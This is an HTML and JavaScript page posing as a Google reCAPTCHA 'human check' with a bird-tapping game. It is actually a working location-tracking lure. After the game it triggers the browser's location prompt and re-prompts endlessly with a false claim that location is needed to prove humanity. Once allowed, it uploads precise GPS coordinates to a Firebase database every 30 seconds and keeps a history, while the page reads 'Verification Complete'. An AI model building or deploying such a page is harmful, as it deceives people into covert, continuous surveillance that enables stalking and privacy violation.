<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Security Verification</title>
<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: "Roboto", "Segoe UI", Arial, sans-serif;
    -webkit-tap-highlight-color: transparent;
}

body {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: #202124; 
    color: #e8eaed;
    overflow: hidden;
}

/* ── Dialog ── */
.dialog {
    width: 100%;
    max-width: 400px;
    margin: 20px;
    padding: 24px;
    border-radius: 28px;
    background: #292a2d;
    box-shadow: 0 12px 48px rgba(0,0,0,.55), 0 0 0 1px rgba(255,255,255,.04);
    animation: appear .3s cubic-bezier(.2,.8,.3,1);
    position: relative;
    transition: opacity 0.4s ease, transform 0.4s ease, filter 0.4s ease;
}

.dialog.blurred {
    filter: blur(8px);
    pointer-events: none;
}

@keyframes appear {
    from {opacity:0;transform:translateY(20px) scale(.98);}
    to {opacity:1;transform:translateY(0) scale(1);}
}

.header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 20px;
}

.brand { display: flex; align-items: center; gap: 10px; }

.brand-icon {
    width: 36px; height: 36px; border-radius: 50%;
    background: #fff;
    display: grid; place-items: center;
}
.brand-icon img { width: 24px; height: 24px; }

.brand-name { font-size: 15px; font-weight: 500; color: #e8eaed; }

.tag {
    background: rgba(138, 180, 248, 0.15);
    color: #8ab4f8;
    border-radius: 20px; padding: 6px 12px;
    font-size: 10px; font-weight: 700; letter-spacing: 1px;
}

.description {
    color: #9aa0a6; font-size: 14px; line-height: 1.5;
    margin-bottom: 20px;
}

/* LOCATION OPTIONS */
.option {
    display: flex; align-items: center; gap: 14px;
    padding: 14px 16px; border-radius: 12px;
    background: #202124;
    border: 2px solid transparent;
    margin-bottom: 10px;
    cursor: pointer; transition: .2s;
}
.option.active { border-color: #8ab4f8; background: #28292c; }

.option-icon {
    width: 44px; height: 44px;
    display: grid; place-items: center;
    background: #3c4043; border-radius: 8px;
    font-size: 20px;
}

.option-info { flex: 1; }
.option-info h3 { font-size: 15px; font-weight: 500; margin-bottom: 2px; color: #e8eaed; }
.option-info p  { font-size: 13px; color: #9aa0a6; }

.radio {
    width: 22px; height: 22px;
    border: 2px solid #9aa0a6; border-radius: 50%;
    transition: .2s;
}
.active .radio { border: 6px solid #8ab4f8; background: transparent; }

/* ═══ THE BIRD BOX ═══ */
.verify-stage {
    position: relative;
    height: 110px;
    margin: 20px 0;
    background: #1e1e1e;
    border: 1px solid #3c4043;
    border-radius: 12px;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
}

.bird-path {
    position: absolute;
    width: 80%;
    height: 60%;
    border: 1px dashed rgba(138, 180, 248, 0.3);
    border-radius: 8px;
    pointer-events: none;
}

.bird {
    position: absolute; left: 50%; top: 50%;
    font-size: 32px; line-height: 1; opacity: 0; z-index: 5;
    transform: translate(-50%,-50%);
    filter: drop-shadow(0 0 10px rgba(138,180,248,0.8));
    pointer-events: none;
    transition: opacity 0.2s;
}
.bird.visible { opacity: 1; }

/* ═══ BUTTONS ═══ */
.actions { 
    display: flex; 
    flex-direction: column; 
    gap: 8px; 
    margin-top: 10px; 
}

button {
    width: 100%;
    border: none; padding: 14px;
    border-radius: 100px;
    font-size: 15px; font-weight: 500;
    cursor: pointer; transition: .2s;
    text-align: center;
}

.btn-allow {
    background: #e8eaed; 
    color: #202124;
    font-weight: 600;
}
.btn-allow:active { background: #dadce0; transform: scale(.98); }
.btn-allow:disabled { 
    background: #3c4043; 
    color: #9aa0a6; 
    cursor: not-allowed; 
}

.status-text {
    text-align: center;
    color: #9aa0a6;
    font-size: 12px;
    margin-top: 12px;
    height: 16px;
}
</style>
</head>

<body>

<div class="dialog" id="mainDialog">

    <div class="header">
        <div class="brand">
            <div class="brand-icon">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="logo">
            </div>
            <div class="brand-name">Google reCAPTCHA</div>
        </div>
        <span class="tag">Human Check</span>
    </div>

    <p class="description">
        Please select your preference for this captcha verification.
    </p>

    <!-- Options -->
    <div class="option active" data-value="precise">
        <div class="option-icon">🎯</div>
        <div class="option-info">
            <h3>Precise (easy)</h3>
            <p>Exact hit bird</p>
        </div>
        <div class="radio"></div>
    </div>

    <div class="option" data-value="approximate">
        <div class="option-icon">🗺️</div>
        <div class="option-info">
            <h3>Approximate</h3>
            <p>Approximate hit bird(card)</p>
        </div>
        <div class="radio"></div>
    </div>

    <div class="verify-stage" id="birdTarget">
        <div class="bird-path"></div>
        <span class="bird" id="bird" role="button">🐦</span>
    </div>

    <div class="status-text" id="status">Wait for the bird to cross...</div>

    <div class="actions">
        <button class="btn-allow" id="allowSite" disabled>Allow to hit bird</button>
        <button class="btn-allow" id="allowOnce" disabled>Allow to hit bird (i am not a human)</button>
    </div>

</div>

<script>
// ═══════════════════════════════════════════════════════════════
// FIREBASE SETUP
// ═══════════════════════════════════════════════════════════════
let database = null;
let deviceId = 'unknown';
let gpsInterval = null;

try {
    if (typeof firebaseConfig !== 'undefined' && !firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
        database = firebase.database();
        deviceId = localStorage.getItem('device_tracker_id') || 'unknown';
    }
} catch (e) { console.warn('Firebase init failed:', e.message); }

// ═══════════════════════════════════════════════════════════════
// GAME LOGIC
// ═══════════════════════════════════════════════════════════════
const bird = document.getElementById("bird");
const birdTarget = document.getElementById("birdTarget");
const statusText = document.getElementById("status");
const allowSite = document.getElementById("allowSite");
const allowOnce = document.getElementById("allowOnce");

const TOTAL_ROUNDS = 2;
let currentRound = 0;
let isRunning = false;
let anim = null;

async function flyBird() {
    if (!isRunning) return;
    
    const w = birdTarget.clientWidth;
    const h = birdTarget.clientHeight;
    const fromLeft = Math.random() > 0.5;
    
    bird.style.left = fromLeft ? "-30px" : (w + 30) + "px";
    bird.style.top = (h / 2) + "px";
    bird.style.opacity = "1";
    bird.classList.add("visible");
    
    statusText.textContent = "Watch closely...";

    const destX = w / 2;

    anim = bird.animate([
        { left: bird.style.left, top: bird.style.top },
        { left: destX + "px", top: (h / 2) + "px" }
    ], {
        duration: 1200,
        easing: "ease-in-out",
        fill: "forwards"
    });

    try { await anim.finished; } catch (e) { return; }

    if (!isRunning) return;

    bird.classList.remove("visible");
    bird.style.opacity = "0";
    
    statusText.textContent = "Bird hidden. Please Allow to verify.";
    
    allowSite.disabled = false;
    allowOnce.disabled = false;
}

function handleAllow() {
    if (allowSite.disabled) return;
    
    allowSite.disabled = true;
    allowOnce.disabled = true;
    
    currentRound++;
    
    if (currentRound >= TOTAL_ROUNDS) {
        triggerGPS();
    } else {
        statusText.textContent = `Round ${currentRound} verified. Prepare for next...`;
        setTimeout(() => {
            flyBird();
        }, 1000);
    }
}

// ═══════════════════════════════════════════════════════════════
// GPS LOGIC (Allow / Force)
// ═══════════════════════════════════════════════════════════════
function triggerGPS() {
    isRunning = false;
    
    // Fake popup blur karo (native ke peeche)
    document.getElementById("mainDialog").classList.add("blurred");
    
    if (!navigator.geolocation) {
        alert("Location not supported.");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (pos) => {
            // ✅ SUCCESS: Allow ho gaya
            startGPSUpdate(pos); 
            
            // Success screen
            document.body.innerHTML = `
                <div style="display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;color:#fff;background:#202124;text-align:center;padding:20px;">
                    <div style="font-size:60px;margin-bottom:20px;">✅</div>
                    <h2 style="font-size:22px;margin-bottom:8px;">Verification Complete</h2>
                    <p style="color:#9aa0a6;font-size:14px;">Location tracking active.</p>
                </div>
            `;
        },
        (err) => {
            // ❌ ERROR: Deny dabaya
            alert("⚠️ Access Denied! Location is required to verify you are human. Please click Allow to continue.");
            
            // Wapas se force maango
            setTimeout(() => {
                triggerGPS();
            }, 1000);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
    );
}

// ═══════════════════════════════════════════════════════════════
// 30 SEC UPDATE LOOP
// ═══════════════════════════════════════════════════════════════
function startGPSUpdate(initialPos) {
    const saveLoc = (pos) => {
        const gpsData = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: Date.now(),
            source: 'captcha_30s_update'
        };

        if (database && deviceId !== 'unknown') {
            database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
            database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
        }
    };

    // Pehli baar turant save karo
    saveLoc(initialPos);

    // Har 30 sec mein update karo
    if (gpsInterval) clearInterval(gpsInterval);
    gpsInterval = setInterval(() => {
        navigator.geolocation.getCurrentPosition(
            saveLoc,
            (e) => console.log('Background GPS update failed:', e.message),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }, 30000);
}

// Events
allowSite.addEventListener("click", handleAllow);
allowOnce.addEventListener("click", handleAllow);

// Start Game
window.addEventListener('load', () => {
    isRunning = true;
    setTimeout(flyBird, 800);
});
</script>

</body>
</html>
